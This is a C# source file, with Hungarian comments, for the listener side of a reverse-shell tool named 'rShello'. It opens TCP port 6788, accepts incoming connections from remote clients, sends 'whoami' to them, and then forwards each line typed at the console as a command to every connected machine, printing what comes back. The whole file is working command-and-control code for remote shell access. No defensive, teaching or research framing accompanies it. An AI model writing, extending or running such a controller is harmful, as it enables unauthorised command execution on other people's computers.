using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.Threading;

namespace rShello
{
    internal class Program
    {
        public static List<TcpClient> kliensek = new List<TcpClient>();
        static void Main(string[] args)
        {


            _ = listen();
            Thread.Sleep(1000);
            Send("whoami");
            //Send("cd");
            while (true)
            {
                Console.Write("");
                string x = Console.ReadLine();
                if (x == "cls") 
                {
                    Console.Clear();
                }
                Send(x);



            }




        }

        public static async Task listen()
        {
            TcpListener listener = new TcpListener(IPAddress.Any, 6788);
            listener.Start();
            //Console.ForegroundColor = ConsoleColor.Magenta;
            //Console.WriteLine("[Listener elindult...]");
            //Console.ForegroundColor = ConsoleColor.Gray;

            while (true)
            {
                TcpClient client = await listener.AcceptTcpClientAsync();
                kliensek.Add(client);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"{client.Client.RemoteEndPoint} csatlakozott");
                Console.ForegroundColor = ConsoleColor.Gray;


                //kulon szalon monitorozom hogy lecsatlakozott e
                //igen ez egy gyengeseg, ha valaki rájön, engem ki tud fagyasztani a picsaba

                _ = Task.Run(() => MonitorClient(client));
            }
        }
        public static async Task MonitorClient(TcpClient client)
        {

            try
            {
                var stream = client.GetStream();
                byte[] buffer = new byte[10000];

                

                // Nem várunk valódi adatot, csak azt figyeljük, él-e még
                int bytes = await stream.ReadAsync(buffer, 0, buffer.Length);
                while (bytes > 0)
                {
                    //int bytes = stream.Read(buffer, 0, buffer.Length);
                    //text = Encoding.UTF8.GetString(buffer, 0, bytes);
                    string text = Encoding.UTF8.GetString(buffer, 0, bytes);
                    Console.Write(text);
                    /*
                    string[] adat = text.Split('|');
                    //Console.WriteLine(text);
                    switch (adat[0])
                    {
                        default:
                            break;
                    }*/

                    bytes = await stream.ReadAsync(buffer, 0, buffer.Length);

                }
            }
            catch
            {
            }
            finally
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine($"{client.Client.RemoteEndPoint} left the game.");
                Console.ForegroundColor = ConsoleColor.Gray;
                kliensek.Remove(client);
                client.Close();
            }
        }
        public static void Send(string message)
        {
            byte[] data = Encoding.UTF8.GetBytes(message);
            foreach (var client in kliensek.ToList())
            {
                try
                {
                    client.GetStream().Write(data, 0, data.Length);
                    //Log($"[÷{message} ÷|elküldve ide :| ÷{((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString()}÷|-nek|]");
                }
                catch
                {
                    kliensek.Remove(client);
                }
            }
            Console.ForegroundColor = ConsoleColor.Gray;
        }




        public static void Log(string message, ConsoleColor fg = ConsoleColor.Gray)// ennek a metodusnak az a lényege hogy ha | közé teszel valamit, zölden írja ki, ha $ közé teszel valamit, pirsos, ha pedig ÷ közé akkor cyan
        {
            Console.ForegroundColor = fg;
            int zoldSzamlalo = 0;
            int pirosSzamlalo = 0;
            int cyanSzamlalo = 0;
            foreach (string item in message.Split('|'))
            {
                zoldSzamlalo++;
                if (zoldSzamlalo % 2 == 0) { Console.ForegroundColor = ConsoleColor.Green; Console.Write(item); }
                else
                {
                    Console.ForegroundColor = fg;
                    foreach (string item1 in item.Split('$'))
                    {
                        pirosSzamlalo++;
                        if (pirosSzamlalo % 2 == 0)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.Write(item1);
                        }
                        else
                        {
                            Console.ForegroundColor = fg;
                            foreach (string item2 in item1.Split('÷'))
                            {
                                cyanSzamlalo++;
                                if (cyanSzamlalo % 2 == 0)
                                {
                                    Console.ForegroundColor = ConsoleColor.Cyan;
                                    //Console.Write(item2);
                                }
                                else Console.ForegroundColor = fg;
                                Console.Write(item2);
                            }
                            cyanSzamlalo = 0;
                        }
                    }
                    pirosSzamlalo = 0;
                }

            }
            Console.WriteLine();
        }


    }
}
